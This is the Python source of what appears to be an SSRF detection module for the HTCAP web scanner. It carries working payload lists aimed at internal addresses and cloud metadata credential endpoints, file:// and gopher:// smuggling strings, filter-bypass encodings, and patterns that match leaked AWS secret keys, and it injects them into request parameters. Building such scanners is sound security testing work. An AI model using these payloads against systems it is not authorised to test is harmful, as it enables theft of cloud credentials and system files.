# -*- coding: utf-8 -*-

"""
HTCAP - Server-Side Request Forgery (SSRF) Fuzzer
Detects SSRF vulnerabilities in web applications.

This program is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free Software
Foundation; either version 2 of the License, or (at your option) any later
version.
"""

import re
import json
import socket
import time
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urlparse, urljoin, quote
from core.scan.base_fuzzer import BaseFuzzer
from core.constants import VULNTYPE_SSRF


class SSRFFuzzer(BaseFuzzer):
    """
    Fuzzer for detecting Server-Side Request Forgery vulnerabilities.

    Detects:
    - Internal network access
    - Cloud metadata endpoints access
    - Protocol smuggling
    - Blind SSRF via timing
    - DNS rebinding potential
    """

    def init(self):
        """Initialize the fuzzer with SSRF-specific payloads."""
        self.name = "SSRF Detection"
        self.description = "Detects Server-Side Request Forgery vulnerabilities"

        # Internal IP addresses and localhost variants
        self.internal_payloads = [
            # Localhost variants
            "http://localhost",
            "http://localhost:80",
            "http://localhost:443",
            "http://localhost:22",
            "http://127.0.0.1",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:22",
            "http://127.1",
            "http://0.0.0.0",
            "http://0",
            "http://[::1]",
            "http://[0:0:0:0:0:0:0:1]",

            # Decimal IP representation
            "http://2130706433",  # 127.0.0.1 in decimal
            "http://017700000001",  # 127.0.0.1 in octal

            # Internal network ranges
            "http://10.0.0.1",
            "http://10.255.255.255",
            "http://172.16.0.1",
            "http://172.31.255.255",
            "http://192.168.0.1",
            "http://192.168.1.1",
            "http://192.168.255.255",

            # Special addresses
            "http://169.254.169.254",  # AWS metadata
            "http://metadata.google.internal",  # GCP metadata
            "http://100.100.100.200",  # Alibaba Cloud metadata
        ]

        # Cloud metadata endpoints
        self.cloud_metadata_payloads = [
            # AWS
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",

            # GCP
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://169.254.169.254/computeMetadata/v1/",

            # Azure
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token",

            # DigitalOcean
            "http://169.254.169.254/metadata/v1/",
            "http://169.254.169.254/metadata/v1/id",

            # Kubernetes
            "https://kubernetes.default.svc/",
            "https://kubernetes.default.svc/api/v1/namespaces",
        ]

        # Protocol handlers for smuggling
        self.protocol_payloads = [
            "file:///etc/passwd",
            "file:///etc/hosts",
            "file:///proc/self/environ",
            "file:///c:/windows/system32/drivers/etc/hosts",
            "dict://localhost:11211/info",
            "gopher://localhost:6379/_INFO",
            "ftp://localhost:21",
            "ldap://localhost:389",
            "tftp://localhost:69",
        ]

        # URL bypass techniques
        self.bypass_payloads = [
            # URL encoding
            "http://127.0.0.1%2509",
            "http://127.0.0.1%00",
            "http://127.0.0.1%0d%0a",

            # Authority confusion
            "http://foo@127.0.0.1",
            "http://foo@127.0.0.1:80@example.com",
            "http://127.0.0.1#@example.com",
            "http://127.0.0.1?@example.com",

            # Enclosed alphanumeric
            "http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ",
            "http://①②⑦.⓪.⓪.①",

            # DNS rebinding (conceptual - would need actual rebinding server)
            "http://localtest.me",  # Resolves to 127.0.0.1
            "http://127.0.0.1.nip.io",
            "http://spoofed.burpcollaborator.net",

            # URL shortener abuse (examples)
            "http://tinyurl.com/localhost-redirect",

            # Double URL encoding
            "http://%31%32%37%2e%30%2e%30%2e%31",

            # Mixed encoding
            "http://127.0.0.%31",
        ]

        # Patterns indicating successful SSRF
        self.success_patterns = [
            # AWS metadata
            r'ami-[a-f0-9]+',
            r'instance-id',
            r'iam.*credentials',
            r'AccessKeyId',
            r'SecretAccessKey',

            # GCP metadata
            r'project/project-id',
            r'service-accounts',
            r'computeMetadata',

            # Azure metadata
            r'subscriptionId',
            r'resourceGroupName',

            # System files
            r'root:.*:0:0:',  # /etc/passwd
            r'localhost.*localhost',  # /etc/hosts

            # Internal services
            r'redis_version',
            r'memcached',
            r'mysql',

            # Error messages indicating internal access
            r'Connection refused',
            r'No route to host',
            r'Network is unreachable',
            r'Name or service not known',
        ]

        # Headers that might contain URLs
        self.url_headers = [
            'X-Forwarded-Host',
            'X-Forwarded-For',
            'X-Original-URL',
            'X-Rewrite-URL',
            'X-Host',
            'Origin',
            'Referer',
        ]

        # Parameter names commonly vulnerable to SSRF
        self.vulnerable_params = [
            'url', 'uri', 'path', 'dest', 'destination', 'redirect', 'next',
            'target', 'rurl', 'domain', 'endpoint', 'file', 'page', 'feed',
            'host', 'site', 'html', 'img', 'image', 'src', 'source', 'link',
            'fetch', 'proxy', 'callback', 'return', 'returnurl', 'return_url',
            'continue', 'load', 'data', 'reference', 'ref', 'window', 'to',
            'out', 'view', 'dir', 'show', 'navigation', 'open', 'goto',
        ]

    def _param_looks_like_url(self, name: str, value: str) -> bool:
        """Check if a parameter appears to be a URL input."""
        name_lower = name.lower()

        # Check if parameter name suggests URL input
        if any(vp in name_lower for vp in self.vulnerable_params):
            return True

        # Check if value looks like a URL
        if value.startswith(('http://', 'https://', '//', 'ftp://')):
            return True

        return False

    def _check_response_for_ssrf(self, response_body: str) -> Optional[str]:
        """Check if response indicates successful SSRF."""
        for pattern in self.success_patterns:
            if re.search(pattern, response_body, re.IGNORECASE):
                return pattern
        return None

    def _measure_response_time(self, request, url: str) -> float:
        """Measure response time for blind SSRF detection."""
        start_time = time.time()
        try:
            self.send_request(request, modified_url=url)
        except:
            pass
        return time.time() - start_time

    def fuzz(self, request, params) -> List[Dict[str, Any]]:
        """
        Execute SSRF fuzzing.

        Args:
            request: The request object to fuzz
            params: Additional parameters

        Returns:
            List of detected vulnerabilities
        """
        vulnerabilities = []

        # Parse request data
        url_params = {}
        if '?' in request.url:
            query = request.url.split('?', 1)[1]
            for param in query.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    url_params[key] = value

        body_params = {}
        if request.data:
            try:
                if isinstance(request.data, str):
                    body_params = json.loads(request.data)
                else:
                    body_params = request.data
            except json.JSONDecodeError:
                # Try URL-encoded form data
                for param in request.data.split('&'):
                    if '=' in param:
                        key, value = param.split('=', 1)
                        body_params[key] = value

        # Identify URL parameters
        target_params = []

        for name, value in url_params.items():
            if self._param_looks_like_url(name, value):
                target_params.append(('url', name, value))

        for name, value in body_params.items():
            if isinstance(value, str) and self._param_looks_like_url(name, value):
                target_params.append(('body', name, value))

        if not target_params:
            return vulnerabilities

        # Test each identified parameter
        for location, param_name, original_value in target_params:

            # Test internal IP payloads
            for payload in self.internal_payloads[:5]:  # Limit for performance
                try:
                    if location == 'url':
                        modified_url = self._replace_url_param(request.url, param_name, payload)
                        response = self.send_request(request, modified_url=modified_url)
                    else:
                        modified_data = self._replace_body_param(request.data, param_name, payload)
                        response = self.send_request(request, data=modified_data)

                    if response:
                        matched = self._check_response_for_ssrf(response.body)
                        if matched:
                            vulnerabilities.append({
                                'type': VULNTYPE_SSRF,
                                'description': f"SSRF vulnerability detected in parameter '{param_name}'. "
                                              f"Payload: {payload}. Evidence pattern: {matched}"
                            })
                            break  # One finding per parameter is enough
                except Exception:
                    pass

            # Test cloud metadata endpoints
            for payload in self.cloud_metadata_payloads[:3]:  # Limit for performance
                try:
                    if location == 'url':
                        modified_url = self._replace_url_param(request.url, param_name, payload)
                        response = self.send_request(request, modified_url=modified_url)
                    else:
                        modified_data = self._replace_body_param(request.data, param_name, payload)
                        response = self.send_request(request, data=modified_data)

                    if response:
                        matched = self._check_response_for_ssrf(response.body)
                        if matched:
                            vulnerabilities.append({
                                'type': VULNTYPE_SSRF,
                                'description': f"Cloud metadata SSRF detected in parameter '{param_name}'. "
                                              f"Payload: {payload}. Evidence: {matched}"
                            })
                            break
                except Exception:
                    pass

            # Test protocol handlers
            for payload in self.protocol_payloads[:3]:
                try:
                    if location == 'url':
                        modified_url = self._replace_url_param(request.url, param_name, payload)
                        response = self.send_request(request, modified_url=modified_url)
                    else:
                        modified_data = self._replace_body_param(request.data, param_name, payload)
                        response = self.send_request(request, data=modified_data)

                    if response:
                        matched = self._check_response_for_ssrf(response.body)
                        if matched:
                            vulnerabilities.append({
                                'type': VULNTYPE_SSRF,
                                'description': f"Protocol smuggling SSRF detected in parameter '{param_name}'. "
                                              f"Payload: {payload}. Evidence: {matched}"
                            })
                            break
                except Exception:
                    pass

        return vulnerabilities

    def _replace_url_param(self, url: str, param: str, value: str) -> str:
        """Replace a URL parameter value."""
        if '?' not in url:
            return url

        base, query = url.split('?', 1)
        new_params = []

        for p in query.split('&'):
            if '=' in p:
                k, v = p.split('=', 1)
                if k == param:
                    new_params.append(f"{k}={quote(value, safe='')}")
                else:
                    new_params.append(p)
            else:
                new_params.append(p)

        return f"{base}?{'&'.join(new_params)}"

    def _replace_body_param(self, data: str, param: str, value: str) -> str:
        """Replace a body parameter value."""
        try:
            body = json.loads(data)
            if isinstance(body, dict) and param in body:
                body[param] = value
                return json.dumps(body)
        except json.JSONDecodeError:
            pass

        # Try URL-encoded form data
        new_params = []
        for p in data.split('&'):
            if '=' in p:
                k, v = p.split('=', 1)
                if k == param:
                    new_params.append(f"{k}={quote(value, safe='')}")
                else:
                    new_params.append(p)
            else:
                new_params.append(p)

        return '&'.join(new_params)
